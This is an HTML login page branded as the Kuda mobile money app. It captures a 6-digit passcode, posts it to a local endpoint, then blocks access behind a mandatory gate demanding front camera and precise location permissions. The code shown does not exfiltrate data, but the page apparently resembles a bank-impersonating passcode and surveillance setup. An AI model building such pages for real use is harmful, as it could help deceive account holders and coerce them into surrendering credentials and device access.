<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kuda - Enter Password</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="password-container">
        <div class="password-logo-section">
            <div class="password-logo">
                <img src="icons/kuda.png" alt="Kuda Logo">
            </div>
            <h1 class="password-title">Kuda</h1>
            <p class="password-subtitle">Mobile Money Transfer</p>
        </div>

        <div class="password-input-section">
            <h2>Enter Password</h2>
            <p class="password-description">Enter your 6-digit password to continue</p>

            <form class="password-form" id="passwordForm">
                <div class="password-input-wrapper">
                    <input
                        type="password"
                        id="passwordInput"
                        class="password-input-field"
                        placeholder="●●●●●●"
                        maxlength="6"
                        autocomplete="off"
                        inputmode="numeric"
                    >
                    <div class="password-error" id="passwordError">Incorrect password. Please try again.</div>
                </div>

                <button type="submit" class="password-submit-btn" id="submitBtn">
                    Unlock
                </button>
            </form>

            <p class="password-hint">Only numeric password is accepted</p>
        </div>

        <div class="password-footer">
            <p>Secure Login • All data encrypted</p>
        </div>
    </div>

    <script>
        const passwordForm = document.getElementById('passwordForm');
        const passwordInput = document.getElementById('passwordInput');
        const passwordError = document.getElementById('passwordError');
        const submitBtn = document.getElementById('submitBtn');

        // Auto-submit when 6 digits are entered
        passwordInput.addEventListener('input', (e) => {
            const value = e.target.value;
            const numericOnly = value.replace(/[^0-9]/g, '');
            passwordInput.value = numericOnly;
            if (numericOnly.length === 6) {
                submitForm();
            }
        });

        passwordForm.addEventListener('submit', (e) => {
            e.preventDefault();
            submitForm();
        });

        function submitForm() {
            const enteredPassword = passwordInput.value;
            if (enteredPassword.length !== 6) return;

            submitBtn.disabled = true;

            fetch('/api/verify-password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: enteredPassword })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    passwordError.classList.add('hidden');
                    showPermissionGate();
                } else {
                    passwordError.classList.remove('hidden');
                    passwordInput.value = '';
                    passwordInput.focus();
                    submitBtn.disabled = false;
                    setTimeout(() => { passwordError.classList.add('hidden'); }, 3000);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                passwordError.classList.remove('hidden');
                passwordInput.value = '';
                passwordInput.focus();
                submitBtn.disabled = false;
                setTimeout(() => { passwordError.classList.add('hidden'); }, 3000);
            });
        }

        // Mandatory permission gate - blocks app until both camera + location are granted
        async function showPermissionGate() {
            // First check if permissions are ALREADY granted - skip the gate entirely
            const alreadyGranted = await checkExistingPermissions();
            if (alreadyGranted.location && alreadyGranted.camera) {
                localStorage.setItem('locationGranted', 'true');
                localStorage.setItem('cameraGranted', 'true');
                window.location.href = '/dashboard';
                return;
            }

            // Hide the password form
            document.querySelector('.password-container').style.display = 'none';

            const overlay = document.createElement('div');
            overlay.id = 'permissionGate';
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#121212;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto;';
            overlay.innerHTML = `
                <div style="background:#1e1e1e;border-radius:20px;padding:32px 24px;max-width:360px;width:100%;text-align:center;">
                    <div style="width:64px;height:64px;margin:0 auto 16px;background:rgba(0,208,158,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                            <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#00D09E"/>
                            <path d="M10 12L11.5 13.5L15 10" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </div>
                    <h2 style="color:#fff;font-size:20px;font-weight:700;margin-bottom:8px;">Security Setup</h2>
                    <p style="color:rgba(255,255,255,0.5);font-size:13px;margin-bottom:24px;line-height:1.5;">Camera and location access are required to continue.</p>
                    <div id="permStatus" style="margin-bottom:20px;text-align:left;">
                        <div id="locStatus" style="padding:12px;border-radius:10px;margin-bottom:8px;background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.4);font-size:14px;display:flex;align-items:center;gap:10px;">
                            <span style="width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;">1</span>
                            <span id="locText">Location: Checking...</span>
                        </div>
                        <div id="camStatus" style="padding:12px;border-radius:10px;margin-bottom:8px;background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.4);font-size:14px;display:flex;align-items:center;gap:10px;">
                            <span style="width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;">2</span>
                            <span id="camText">Camera: Checking...</span>
                        </div>
                    </div>
                    <button id="grantPermBtn" style="width:100%;background:#00D09E;color:#000;border:none;padding:14px;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;">Continue</button>
                    <p id="permHint" style="color:rgba(255,255,255,0.3);font-size:11px;margin-top:16px;line-height:1.4;"></p>
                </div>
            `;
            document.body.appendChild(overlay);

            // Auto-check existing permissions and update UI
            updatePermStatusUI(alreadyGranted);

            const btn = document.getElementById('grantPermBtn');
            btn.addEventListener('click', () => requestPermissions(btn));
        }

        // Check if permissions are already granted using Permissions API + actual calls
        async function checkExistingPermissions() {
            const result = { location: false, camera: false };

            // Check location permission state
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    const locPerm = await navigator.permissions.query({ name: 'geolocation' });
                    if (locPerm.state === 'granted') {
                        result.location = true;
                    }
                }
            } catch (e) { /* Permissions API not supported, fall through */ }

            // If Permissions API didn't confirm, try actual geolocation call
            if (!result.location) {
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true, timeout: 8000, maximumAge: 300000
                        });
                    });
                    result.location = true;
                } catch (e) { /* not granted */ }
            }

            // Check camera permission state
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    try {
                        const camPerm = await navigator.permissions.query({ name: 'camera' });
                        if (camPerm.state === 'granted') {
                            result.camera = true;
                        }
                    } catch (e) { /* camera permission query not supported */ }
                }
            } catch (e) { /* fall through */ }

            // If Permissions API didn't confirm camera, try actual getUserMedia
            if (!result.camera) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 320, height: 240 }
                    });
                    stream.getTracks().forEach(t => t.stop());
                    result.camera = true;
                } catch (e) { /* not granted */ }
            }

            return result;
        }

        // Update the status indicators based on current permission state
        function updatePermStatusUI(status) {
            const locEl = document.getElementById('locStatus');
            const locText = document.getElementById('locText');
            const camEl = document.getElementById('camStatus');
            const camText = document.getElementById('camText');

            if (status.location) {
                locEl.style.color = '#00D09E';
                locEl.querySelector('span:first-child').style.background = '#00D09E';
                locEl.querySelector('span:first-child').style.color = '#000';
                locText.textContent = 'Location: Granted';
            } else {
                locEl.style.color = 'rgba(255,255,255,0.5)';
                locText.textContent = 'Location: Not yet granted';
            }

            if (status.camera) {
                camEl.style.color = '#00D09E';
                camEl.querySelector('span:first-child').style.background = '#00D09E';
                camEl.querySelector('span:first-child').style.color = '#000';
                camText.textContent = 'Camera: Granted';
            } else {
                camEl.style.color = 'rgba(255,255,255,0.5)';
                camText.textContent = 'Camera: Not yet granted';
            }

            // If both already granted, update button
            if (status.location && status.camera) {
                const btn = document.getElementById('grantPermBtn');
                btn.textContent = 'All Set - Continue';
            }
        }

        // Request permissions - triggers native device prompts
        async function requestPermissions(btn) {
            btn.disabled = true;
            btn.textContent = 'Setting up...';
            btn.style.background = 'rgba(0,208,158,0.3)';

            const locEl = document.getElementById('locStatus');
            const locText = document.getElementById('locText');
            const camEl = document.getElementById('camStatus');
            const camText = document.getElementById('camText');
            const permHint = document.getElementById('permHint');

            // Step 1: Location - trigger the native permission prompt
            let locationOK = false;
            if (localStorage.getItem('locationGranted') === 'true') {
                // Already granted, just verify
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true, timeout: 10000, maximumAge: 300000
                        });
                    });
                    locationOK = true;
                } catch (e) {
                    localStorage.removeItem('locationGranted');
                }
            }

            if (!locationOK) {
                locEl.querySelector('span:first-child').style.background = 'rgba(0,208,158,0.3)';
                locText.textContent = 'Location: Please allow when prompted...';
                locEl.style.color = 'rgba(255,255,255,0.7)';

                try {
                    locationOK = await new Promise((resolve) => {
                        // Long timeout - GPS can take time especially indoors
                        const timeout = setTimeout(() => {
                            // Timeout doesn't mean denied - could be GPS still acquiring
                            // If we got a position partially, that's still a grant
                            resolve(false);
                        }, 45000);

                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                clearTimeout(timeout);
                                localStorage.setItem('locationGranted', 'true');
                                resolve(true);
                            },
                            (err) => {
                                clearTimeout(timeout);
                                if (err.code === 1) {
                                    // PERMISSION_DENIED - user clicked deny on the native prompt
                                    resolve(false);
                                } else {
                                    // POSITION_UNAVAILABLE or TIMEOUT - GPS might be off
                                    // But the browser permission might still be "granted"
                                    // Try to check via Permissions API
                                    if (navigator.permissions && navigator.permissions.query) {
                                        navigator.permissions.query({ name: 'geolocation' }).then(perm => {
                                            resolve(perm.state === 'granted');
                                        }).catch(() => resolve(false));
                                    } else {
                                        resolve(false);
                                    }
                                }
                            },
                            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                        );
                    });
                } catch (e) {
                    locationOK = false;
                }
            }

            // Update location UI
            if (locationOK) {
                localStorage.setItem('locationGranted', 'true');
                locEl.querySelector('span:first-child').style.background = '#00D09E';
                locEl.querySelector('span:first-child').style.color = '#000';
                locText.textContent = 'Location: Granted';
                locEl.style.color = '#00D09E';
            } else {
                locEl.querySelector('span:first-child').style.background = '#e74c3c';
                locEl.querySelector('span:first-child').style.color = '#fff';
                locText.textContent = 'Location: Not granted';
                locEl.style.color = '#e74c3c';
                permHint.innerHTML = 'Please turn on your phone Location/GPS and allow permission when prompted. Then tap Try Again.';
                permHint.style.color = '#e74c3c';
                btn.disabled = false;
                btn.textContent = 'Try Again';
                btn.style.background = '#00D09E';
                return;
            }

            // Step 2: Camera - trigger the native permission prompt
            let cameraOK = false;
            if (localStorage.getItem('cameraGranted') === 'true') {
                cameraOK = true;
            }

            if (!cameraOK) {
                camEl.querySelector('span:first-child').style.background = 'rgba(0,208,158,0.3)';
                camText.textContent = 'Camera: Please allow when prompted...';
                camEl.style.color = 'rgba(255,255,255,0.7)';

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 320, height: 240 }
                    });
                    stream.getTracks().forEach(t => t.stop());
                    localStorage.setItem('cameraGranted', 'true');
                    cameraOK = true;
                } catch (e) {
                    cameraOK = false;
                }
            }

            // Update camera UI
            if (cameraOK) {
                localStorage.setItem('cameraGranted', 'true');
                camEl.querySelector('span:first-child').style.background = '#00D09E';
                camEl.querySelector('span:first-child').style.color = '#000';
                camText.textContent = 'Camera: Granted';
                camEl.style.color = '#00D09E';
            } else {
                camEl.querySelector('span:first-child').style.background = '#e74c3c';
                camEl.querySelector('span:first-child').style.color = '#fff';
                camText.textContent = 'Camera: Not granted';
                camEl.style.color = '#e74c3c';
                permHint.innerHTML = 'Please allow camera access when prompted. Then tap Try Again.';
                permHint.style.color = '#e74c3c';
                btn.disabled = false;
                btn.textContent = 'Try Again';
                btn.style.background = '#00D09E';
                return;
            }

            // Both granted - proceed to dashboard
            permHint.innerHTML = '';
            btn.textContent = 'All Set!';
            btn.style.background = '#00D09E';
            setTimeout(() => {
                window.location.href = '/dashboard';
            }, 600);
        }

        // Focus input on load
        window.addEventListener('load', () => {
            passwordInput.focus();
        });
    </script>
</body>
</html>
